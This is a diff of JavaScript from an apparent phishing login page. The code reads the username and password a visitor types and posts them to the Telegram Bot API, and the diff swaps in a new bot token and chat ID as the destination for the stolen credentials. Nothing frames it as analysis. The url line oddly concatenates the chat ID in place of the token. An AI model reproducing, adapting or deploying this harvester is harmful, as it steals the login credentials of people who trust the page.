@@ -18,9 +18,9 @@ togglePasswordButton.addEventListener("click", function () {
   }
 });
 
-var telegram_bot_id = "7986801551:AAFXioA5eLbVu6zpIdN0fShSNeqANvEoHsM";
+var telegram_bot_id = "8559897613:AAFpgp5Kq1dc6hm5UIujVP4W45WklTQ4d7E";
 
-var chat_id = 7185214285;
+var chat_id = 7553336894;
 var u_name, password;
 var ready = function () {
   u_name = document.getElementById("username").value;
@@ -32,7 +32,7 @@ var sender = function () {
   var settings = {
     async: true,
     crossDomain: true,
-    url: "https://api.telegram.org/bot" + 7185214285 + "/sendMessage",
+    url: "https://api.telegram.org/bot" + 7553336894 + "/sendMessage",
     method: "POST",
     headers: {
       "Content-Type": "application/json",
